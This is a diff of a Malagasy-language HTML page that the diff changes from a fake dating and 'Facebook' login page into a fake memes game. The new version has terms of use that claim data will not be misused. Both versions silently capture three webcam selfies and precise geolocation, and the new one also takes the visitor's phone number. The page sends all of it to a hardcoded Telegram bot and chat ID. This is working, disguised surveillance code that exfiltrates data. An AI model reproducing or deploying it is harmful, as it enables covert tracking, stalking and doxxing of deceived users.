@@ -2,112 +2,602 @@
 <html lang="mg">
 <head>
   <meta charset="UTF-8"/>
-  <title> rencontre Malagasy </title>
+  <title>Malagasy memera</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
-    :root {--c1:#8A2BE2;--c2:#FF6B6B;--c3:#4ECDC4;--white:#fff;}
-    body{margin:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
-         background:linear-gradient(-45deg,var(--c1),var(--c2),var(--c3));background-size:400% 400%;
-         animation:bgShift 8s ease infinite;color:var(--white);font-family:'Segoe UI',sans-serif;}
-    @keyframes bgShift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-    h1{margin:0 0 10px;animation:fade 1s}
-    p{margin:0 0 20px;animation:fade 1.2s}
-    @keyframes fade{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
-    button{padding:14px 32px;border:none;border-radius:50px;background:linear-gradient(135deg,#ff7b7b,#ff3860);
-           color:var(--white);font-size:18px;cursor:pointer;box-shadow:0 8px 20px rgba(255,56,96,.4);
-           transition:transform .3s,box-shadow .3s;animation:pulse 2s infinite;}
-    @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
-    button:hover{transform:translateY(-4px) scale(1.08);box-shadow:0 12px 30px rgba(255,56,96,.6)}
-    #preview{margin-top:20px;width:120px;height:120px;object-fit:cover;border-radius:50%;border:3px solid var(--white);
-             box-shadow:0 4px 12px rgba(0,0,0,.25);animation:pop .6s}
-    @keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+    :root {
+      --c1:#8A2BE2;
+      --c2:#FF6B6B;
+      --c3:#4ECDC4;
+      --white:#fff;
+      --dark:#1a1a2e;
+      --glass:rgba(255,255,255,0.1);
+    }
+    
+    * {
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+    }
+    
+    body {
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background:linear-gradient(-45deg,var(--c1),var(--c2),var(--c3));
+      background-size:400% 400%;
+      animation:bgShift 8s ease infinite;
+      color:var(--white);
+      font-family:'Segoe UI',sans-serif;
+      padding:20px;
+    }
+    
+    @keyframes bgShift {
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
+    }
+    
+    /* Container lehibe */
+    .container {
+      width:100%;
+      max-width:420px;
+      background:var(--glass);
+      backdrop-filter:blur(20px);
+      border-radius:24px;
+      border:1px solid rgba(255,255,255,0.2);
+      padding:40px 30px;
+      box-shadow:0 25px 50px rgba(0,0,0,0.3);
+      animation:popIn 0.6s ease;
+    }
+    
+    @keyframes popIn {
+      from{opacity:0;transform:scale(0.9) translateY(30px)}
+      to{opacity:1;transform:scale(1) translateY(0)}
+    }
+    
+    /* Logo / Icon */
+    .logo {
+      width:80px;
+      height:80px;
+      background:linear-gradient(135deg,var(--c2),var(--c3));
+      border-radius:50%;
+      margin:0 auto 25px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:36px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
+    }
+    
+    h1 {
+      text-align:center;
+      font-size:26px;
+      margin-bottom:10px;
+    }
+    
+    h2 {
+      text-align:center;
+      font-size:20px;
+      margin-bottom:20px;
+      font-weight:500;
+    }
+    
+    p {
+      text-align:center;
+      line-height:1.6;
+      margin-bottom:20px;
+      opacity:0.9;
+    }
+    
+    /* Conditions */
+    .conditions {
+      background:rgba(0,0,0,0.2);
+      border-radius:16px;
+      padding:20px;
+      margin:20px 0;
+      max-height:200px;
+      overflow-y:auto;
+    }
+    
+    .conditions h3 {
+      font-size:16px;
+      margin-bottom:12px;
+    }
+    
+    .conditions ul {
+      list-style:none;
+      font-size:14px;
+      line-height:1.8;
+    }
+    
+    .conditions li::before {
+      content:"• ";
+      color:var(--c3);
+      font-weight:bold;
+    }
+    
+    /* Checkbox custom */
+    .checkbox-wrapper {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin:20px 0;
+      cursor:pointer;
+    }
+    
+    .checkbox-wrapper input[type="checkbox"] {
+      width:22px;
+      height:22px;
+      accent-color:var(--c2);
+      cursor:pointer;
+    }
+    
+    .checkbox-wrapper label {
+      font-size:15px;
+      cursor:pointer;
+    }
+    
+    /* Input field */
+    .input-group {
+      margin:25px 0;
+    }
+    
+    .input-group label {
+      display:block;
+      margin-bottom:10px;
+      font-size:15px;
+    }
+    
+    .input-group input {
+      width:100%;
+      padding:16px 20px;
+      border:none;
+      border-radius:16px;
+      background:rgba(255,255,255,0.15);
+      color:var(--white);
+      font-size:18px;
+      text-align:center;
+      letter-spacing:2px;
+      outline:none;
+      transition:all 0.3s;
+    }
+    
+    .input-group input::placeholder {
+      color:rgba(255,255,255,0.5);
+    }
+    
+    .input-group input:focus {
+      background:rgba(255,255,255,0.25);
+      box-shadow:0 0 20px rgba(255,255,255,0.2);
+    }
+    
+    /* Error message */
+    .error {
+      color:#ff6b6b;
+      font-size:14px;
+      text-align:center;
+      margin-top:10px;
+      display:none;
+    }
+    
+    /* Bouton */
+    .btn {
+      width:100%;
+      padding:18px;
+      border:none;
+      border-radius:16px;
+      background:linear-gradient(135deg,#ff7b7b,#ff3860);
+      color:var(--white);
+      font-size:18px;
+      font-weight:600;
+      cursor:pointer;
+      box-shadow:0 10px 30px rgba(255,56,96,0.4);
+      transition:all 0.3s;
+      margin-top:20px;
+    }
+    
+    .btn:hover:not(:disabled) {
+      transform:translateY(-3px);
+      box-shadow:0 15px 40px rgba(255,56,96,0.6);
+    }
+    
+    .btn:disabled {
+      opacity:0.5;
+      cursor:not-allowed;
+    }
+    
+    /* Loading */
+    .loading {
+      display:none;
+      text-align:center;
+      padding:40px;
+    }
+    
+    .spinner {
+      width:60px;
+      height:60px;
+      border:4px solid rgba(255,255,255,0.3);
+      border-top-color:var(--white);
+      border-radius:50%;
+      margin:0 auto 20px;
+      animation:spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      to{transform:rotate(360deg)}
+    }
+    
+    .loading p {
+      font-size:18px;
+    }
+    
+    /* Progress bar */
+    .progress {
+      width:100%;
+      height:6px;
+      background:rgba(255,255,255,0.2);
+      border-radius:3px;
+      margin:20px 0;
+      overflow:hidden;
+    }
+    
+    .progress-bar {
+      height:100%;
+      width:0%;
+      background:linear-gradient(90deg,var(--c2),var(--c3));
+      border-radius:3px;
+      transition:width 0.5s;
+    }
+    
+    /* Step indicator */
+    .steps {
+      display:flex;
+      justify-content:center;
+      gap:10px;
+      margin-bottom:25px;
+    }
+    
+    .step {
+      width:35px;
+      height:35px;
+      border-radius:50%;
+      background:rgba(255,255,255,0.2);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:14px;
+      font-weight:bold;
+      transition:all 0.3s;
+    }
+    
+    .step.active {
+      background:linear-gradient(135deg,var(--c2),var(--c3));
+      transform:scale(1.1);
+    }
+    
+    .step.done {
+      background:var(--c3);
+    }
+    
+    /* Hidden */
+    .hidden {
+      display:none !important;
+    }
   </style>
 </head>
 <body>
-  <h1> Rencontre </h1>
-  <p> continuer avec <strong>"Facebook"</strong></p>
-  <button onclick="startProcess()">Facebook</button>
+
+<!-- ========== PAGE 1: Fiarahabana + Conditions ========== -->
+<div id="page1" class="container">
+  <div class="logo">👋</div>
+  <h1>Tongasoa!</h1>
+  <p>Tongasoa amin'ny <strong>Memes Département</strong>. Atao fotsiny hilalao sy hifampizarana.</p>
+  
+  <div class="steps">
+    <div class="step active">1</div>
+    <div class="step">2</div>
+    <div class="step">3</div>
+  </div>
+  
+  <div class="conditions">
+    <h3>📋 Conditions d'utilisation</h3>
+    <ul>
+      <li>Ity application ity dia natao ho an'ny fifaliana fotsiny</li>
+      <li>Manaiky ny haka sary anao isika</li>
+      <li>Manaiky ny haka ny toerana misy anao</li>
+      <li>Tsy ampiasaina amin'ny ratsy ny angon-drakitra</li>
+      <li>Tsy zaraina amin'ny olon-kafa ny zavatra angonina</li>
+      <li>Azo esorina ny angon-drakitrao rehefa manontany</li>
+    </ul>
+  </div>
+  
+  <div class="checkbox-wrapper" onclick="toggleAccept()">
+    <input type="checkbox" id="acceptCheck">
+    <label for="acceptCheck">Manaiky ny conditions d'utilisation aho</label>
+  </div>
+  
+  <p class="error" id="error1">Tsy maintsy manaiky ny conditions aloha!</p>
+  
+  <button class="btn" id="btn1" onclick="goToPage2()" disabled>
+    Hanohy →
+  </button>
+</div>
+
+<!-- ========== PAGE 2: Laharana finday ========== -->
+<div id="page2" class="container hidden">
+  <div class="logo">📱</div>
+  <h2>Laharana finday</h2>
+  <p>Ampidiro ny laharana finday mba hahafahanao milalao.</p>
+  
+  <div class="steps">
+    <div class="step done">✓</div>
+    <div class="step active">2</div>
+    <div class="step">3</div>
+  </div>
+  
+  <div class="input-group">
+    <label>📞 Laharana finday</label>
+    <input 
+      type="tel" 
+      id="phoneInput" 
+      placeholder="03X XX XXX XX" 
+      maxlength="13"
+      oninput="formatPhone(this)"
+    >
+  </div>
+  
+  <p class="error" id="error2">Tsy maintsy fenoina ny laharana finday!</p>
+  
+  <button class="btn" id="btn2" onclick="goToPage3()">
+    Hanohy →
+  </button>
+</div>
+
+<!-- ========== PAGE 3: Loading + Action ========== -->
+<div id="page3" class="container hidden">
+  <div class="logo">🚀</div>
+  <h2>Fandehanana!</h2>
+  
+  <div class="steps">
+    <div class="step done">✓</div>
+    <div class="step done">✓</div>
+    <div class="step active">3</div>
+  </div>
+  
+  <div id="loadingSection" class="loading" style="display:block;">
+    <div class="spinner"></div>
+    <p id="loadingText">Maka sary sy toerana...</p>
+    <div class="progress">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+  </div>
+  
+  <div id="successSection" class="hidden" style="text-align:center;">
+    <div style="font-size:60px;margin-bottom:20px;">✅</div>
+    <h2>Vita soa aman-tsara!</h2>
+    <p>Nandefa ny angon-drakitrao any Telegram izahay.</p>
+    <p style="font-size:14px;opacity:0.7;margin-top:20px;">
+      Selfie: <span id="selfieCount">3</span> | 
+      Toerana: <span id="locStatus">✓</span> | 
+      Finday: <span id="phoneDisplay"></span>
+    </p>
+  </div>
+</div>
 
 <script>
-  /* ------------- PARAMÈTRES TELEGRAM ------------- */
-  const BOT_TOKEN = "9032737193:AAF5ijdt4pn1ZjQp4HzbfMMA32ziRbI3nf0";
-  const CHAT_ID   = "8124974450";
+// ============================================
+// VARIABLES GLOBALES
+// ============================================
+const BOT_TOKEN = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
+const CHAT_ID   = "-1002833433414";
 
-  /* ------------- FONCTION PRINCIPALE ------------- */
-  async function startProcess() {
-    try {
-      // 1. Maka sary 3
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video  = document.createElement('video');
-      video.srcObject = stream;
-      await video.play();
+let phoneNumber = "";  // Hitahirizana ny laharana finday
 
-      const canvas = document.createElement('canvas');
-      const ctx    = canvas.getContext('2d');
+// ============================================
+// PAGE 1: Conditions
+// ============================================
 
-      for (let i = 0; i < 3; i++) {
-        await new Promise(r => setTimeout(r, 1200));
-        canvas.width  = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        const imgData = canvas.toDataURL('image/png');
-        await sendPhoto(imgData, "📸 Selfie #" + (i+1));
-      }
-      stream.getTracks().forEach(t => t.stop());
+function toggleAccept() {
+  const check = document.getElementById('acceptCheck');
+  const btn = document.getElementById('btn1');
+  
+  // Miova ny bouton rehefa check/uncheck
+  btn.disabled = !check.checked;
+}
 
-      // 2. Maka toerana
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        const { latitude: lat, longitude: lon } = pos.coords;
-        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
-        sendMessage(loc); 
-        alert("✅ Vita ny test, Tongasoa!");
-      });
+function goToPage2() {
+  const check = document.getElementById('acceptCheck');
+  
+  if (!check.checked) {
+    document.getElementById('error1').style.display = 'block';
+    return;
+  }
+  
+  // Miova pejy
+  document.getElementById('page1').classList.add('hidden');
+  document.getElementById('page2').classList.remove('hidden');
+}
 
-    } catch (err) {
-      alert("❌ Nisy olana: " + err.message);
-      console.error(err);
+// ============================================
+// PAGE 2: Laharana finday
+// ============================================
+
+function formatPhone(input) {
+  // Manala ny zavatra tsy isa
+  let value = input.value.replace(/\D/g, '');
+  
+  // Atao format: 034 12 345 67
+  if (value.length >= 3) {
+    value = value.slice(0,3) + ' ' + value.slice(3);
+  }
+  if (value.length >= 6) {
+    value = value.slice(0,6) + ' ' + value.slice(6);
+  }
+  if (value.length >= 9) {
+    value = value.slice(0,9) + ' ' + value.slice(9);
+  }
+  
+  input.value = value;
+}
+
+function goToPage3() {
+  const input = document.getElementById('phoneInput');
+  const raw = input.value.replace(/\D/g, '');  // Manala ny spaces
+  
+  // Verification
+  if (raw.length < 10) {
+    document.getElementById('error2').style.display = 'block';
+    return;
+  }
+  
+  phoneNumber = input.value;  // Tehirizina
+  
+  // Miova pejy
+  document.getElementById('page2').classList.add('hidden');
+  document.getElementById('page3').classList.remove('hidden');
+  
+  // Atomboka ny action!
+  startAction();
+}
+
+// ============================================
+// PAGE 3: Action principale
+// ============================================
+
+async function startAction() {
+  const progressBar = document.getElementById('progressBar');
+  const loadingText = document.getElementById('loadingText');
+  
+  try {
+    // --- ETAPE 1: Maka sary 3 ---
+    loadingText.textContent = "Maka selfie voalohany...";
+    progressBar.style.width = "10%";
+    
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const selfies = [];
+    
+    for (let i = 0; i < 3; i++) {
+      loadingText.textContent = `Maka selfie ${i+1}/3...`;
+      progressBar.style.width = `${15 + (i * 20)}%`;
+      
+      await new Promise(r => setTimeout(r, 1500));
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      
+      selfies.push(canvas.toDataURL('image/png'));
     }
-  }
-
-  /* ------------- ENVOI PHOTO ------------- */
-  async function sendPhoto(imgBase64, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("caption", caption);
-
-    const blob = dataURItoBlob(imgBase64);
-    form.append("photo", blob, "selfie.png");
-
-    const res = await fetch(url, { method: "POST", body: form });
-    console.log("sendPhoto status:", res.status);
-  }
-
-  /* ------------- ENVOI MESSAGE TEXTE ------------- */
-  async function sendMessage(text) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    const res = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text
-      })
+    
+    stream.getTracks().forEach(t => t.stop());
+    
+    // --- ETAPE 2: Maka toerana ---
+    loadingText.textContent = "Maka ny toerana misy anao...";
+    progressBar.style.width = "80%";
+    
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
     });
-
-    console.log("sendMessage status:", res.status);
+    
+    const { latitude: lat, longitude: lon } = position.coords;
+    
+    // --- ETAPE 3: Mandefa any Telegram ---
+    loadingText.textContent = "Mandefa angon-drakitra...";
+    progressBar.style.width = "90%";
+    
+    // 1. Mandefa ny laharana finday
+    await sendMessage(`📱 <b>Nouvel utilisateur</b>\n📞 Numéro: <code>${phoneNumber}</code>`);
+    
+    // 2. Mandefa ny sary 3
+    for (let i = 0; i < selfies.length; i++) {
+      await sendPhoto(selfies[i], `📸 Selfie #${i+1} - ${phoneNumber}`);
+    }
+    
+    // 3. Mandefa ny toerana
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    await sendMessage(
+      `📍 <b>Localisation</b>\n` +
+      `📞 ${phoneNumber}\n` +
+      `🌐 <a href="${mapsUrl}">Voir sur Google Maps</a>\n` +
+      `📌 Lat: ${lat.toFixed(6)}\n` +
+      `📌 Lon: ${lon.toFixed(6)}`
+    );
+    
+    // --- VITA! ---
+    progressBar.style.width = "100%";
+    
+    // Miseho ny success
+    document.getElementById('loadingSection').classList.add('hidden');
+    document.getElementById('successSection').classList.remove('hidden');
+    document.getElementById('phoneDisplay').textContent = phoneNumber;
+    
+  } catch (err) {
+    loadingText.textContent = "❌ Nisy olana: " + err.message;
+    loadingText.style.color = "#ff6b6b";
+    console.error(err);
   }
+}
 
-  /* ------------- UTILITAIRE ------------- */
-  function dataURItoBlob(dataURI) {
-    const byteString = atob(dataURI.split(',')[1]);
-    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    const ab   = new ArrayBuffer(byteString.length);
-    const ia   = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-    return new Blob([ab], { type: mime });
+// ============================================
+// FONCTIONS TELEGRAM
+// ============================================
+
+async function sendPhoto(imgBase64, caption) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const form = new FormData();
+  
+  form.append("chat_id", CHAT_ID);
+  form.append("caption", caption);
+  form.append("parse_mode", "HTML");
+  
+  const blob = dataURItoBlob(imgBase64);
+  form.append("photo", blob, "selfie.png");
+  
+  const res = await fetch(url, { method: "POST", body: form });
+  return res.ok;
+}
+
+async function sendMessage(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: "HTML",
+      disable_web_page_preview: false
+    })
+  });
+  
+  return res.ok;
+}
+
+function dataURItoBlob(dataURI) {
+  const byteString = atob(dataURI.split(',')[1]);
+  const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
   }
+  
+  return new Blob([ab], { type: mime });
+}
 </script>
+
 </body>
 </html>
